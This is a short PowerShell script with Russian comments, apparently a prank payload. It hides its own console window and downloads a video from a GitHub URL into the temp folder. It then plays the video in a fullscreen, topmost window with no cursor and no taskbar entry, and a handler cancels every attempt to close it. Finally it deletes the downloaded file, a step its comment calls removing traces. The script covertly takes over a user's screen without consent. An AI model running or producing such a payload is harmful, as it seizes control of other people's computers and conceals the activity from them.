# Устанавливаем TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Скрываем окно консоли
try {
    $c = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);'
    $t = Add-Type -MemberDefinition $c -Name "W" -Namespace "Win" -PassThru
    $t::ShowWindow((Get-Process -Id $pid).MainWindowHandle, 0)
} catch {}

Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase

# Прямая ссылка на видео
$u = 'https://raw.githubusercontent.com/ymkeee/T-Embed/main/assets/edit.mp4'
# ПРАВИЛЬНЫЙ ГЕНЕРАТОР ИМЕНИ ФАЙЛА
$f = "$env:TEMP\$([guid]::NewGuid().ToString()).mp4"

try {
    Invoke-WebRequest -Uri $u -OutFile $f
    
    [xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        WindowStyle="None" WindowState="Maximized" Topmost="True" 
        Background="Black" Cursor="None" ShowInTaskbar="False">
    <Grid><MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" /></Grid>
</Window>
"@

    $reader = New-Object System.Xml.XmlNodeReader $xaml
    $w = [Windows.Markup.XamlReader]::Load($reader)
    $v = $w.FindName("v")

    $v.add_MediaEnded({ $w.Close() })
    $w.Add_Closing({ $_.Cancel = $true })

    $w.ShowDialog() | Out-Null
} finally {
    # Удаление следов
    if (Test-Path $f) { Remove-Item -Path $f -Force }
}
